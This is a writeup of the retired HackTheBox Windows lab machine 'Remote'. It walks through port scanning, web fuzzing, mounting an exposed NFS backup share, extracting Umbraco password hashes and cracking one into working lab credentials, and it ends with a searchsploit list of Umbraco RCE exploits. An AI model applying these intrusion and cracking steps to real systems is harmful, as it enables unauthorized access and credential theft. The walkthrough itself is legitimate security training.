Title:HTB: Remote
Date: xx-21-2020 17:10
category:security
tags:security, boot2root, HTB, windows,
meta:security, boot2root, HTB, windows,

<img class="align-left" src="/media/2020.xx/remote_card.png" alt="Remote card" width="262">

This is a writeup about a retired HacktheBox machine:
[Remote](https://www.hackthebox.eu/home/machines/profile/234) published by
[mrb3n](https://www.hackthebox.eu/home/users/profile/2984) on Mars the 21th 2020.
This box is a Windows machine classified as easy.

<!-- PELICAN_END_SUMMARY -->

# Initial foothold

We start with an nmap scan. 10 ports are open.

    :::text
    # Nmap 7.80 scan initiated Thu Mar 26 10:51:40 2020 as: nmap -sS -oN nmap2 --top-ports=10000 -sV 10.10.10.180
    Nmap scan report for 10.10.10.180
    Host is up (0.30s latency).
    Not shown: 8310 closed ports
    PORT      STATE SERVICE       VERSION
    21/tcp    open  ftp           Microsoft ftpd
    80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    111/tcp   open  rpcbind       2-4 (RPC #100000)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds?
    2049/tcp  open  mountd        1-3 (RPC #100005)
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    49678/tcp open  msrpc         Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Thu Mar 26 11:02:07 2020 -- 1 IP address (1 host up) scanned in 626.37 seconds

For each port we will look what service is running an how we can enumerate them:
 * Port 21: FTP, **we will dig it more**
 * Port 80: A website, **we will dig it more**
 * Port 111: rpcbind, nothing here
 * Port 135: MS Windows RPC, nothing here
 * Port 139 and 445: SMB, **we will dig it more**
 * Port 2049: NFS, **we will dig it more**
 * Port 5985: some HTTP service but nothing available
 * Port 47001: some HTTP service but nothing available
 * Port 49678: MS Windows RPC, nothing here

## FTP

We try to connect to the FTP using an anonymous connection. At this time (Mars
27th 2020) Firefox still support this protocol. But there is no file available
with the anonymous account.

## SMB

We try to enumerate the SMB share and users using the metasploit modules
`auxiliary/scanner/smb/smb_enumshares` and
`auxiliary/scanner/smb/smb_enumshares` but there is nothing interesting here.

## Web

    :::text
    $ ./ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.180/FUZZ -mc 200 -c -v
    <SNIP>
    [Status: 200, Size: 4040, Words: 710, Lines: 96]
    | URL | http://10.10.10.180/umbraco


## NFS

We enumerate the NFS share using the `auxiliary/scanner/nfs/nfsmount` metasploit
module. We found that the share `/site_backups` is exposed.

    :::text
    msf5 > use auxiliary/scanner/nfs/nfsmount
    msf5 auxiliary(scanner/nfs/nfsmount) > set RhOSTS 10.10.10.180
    RhOSTS => 10.10.10.180
    msf5 auxiliary(scanner/nfs/nfsmount) > run

    [+] 10.10.10.180:111      - 10.10.10.180 NFS Export: /site_backups []
    [*] 10.10.10.180:111      - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

We mount the share in a temporary folder using `mount`.

    :::text
    $ mkdir /tmp/nfs
    $ mount -t nfs 10.10.10.180:/site_backups /tmp/nfs -nolock
    $ cd /tmp/nfs/
    $ ls
    App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
    $ ls App_Data
    cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf


https://our.umbraco.com/forum/umbraco-8/96468-umbraco-8-database-file

strings ~/pentest/htb_remote/Umbraco.sdf  | less
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32

$ john hash -w=tools/password_lists/rockyou.txt
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)

The credentials admin@htb.local:baconandcheese allow us ton connect to the
Umbreco interface.

## Umbreco

    :::text
    $ searchsploit umbraco
    --------------------------------------- ----------------------------------------
    Exploit Title                         |  Path
                                          | (/usr/share/exploitdb/)
    --------------------------------------- ----------------------------------------
    Umbraco CMS - Remote Command Execution | exploits/windows/webapps/19671.rb
    Umbraco CMS 7.12.4 - (Authenticated) R | exploits/aspx/webapps/46153.py
    Umbraco CMS SeoChecker Plugin 1.9.2 -  | exploits/php/webapps/44988.txt
    --------------------------------------- ----------------------------------------
    Shellcodes: No Result
    Papers: No Result

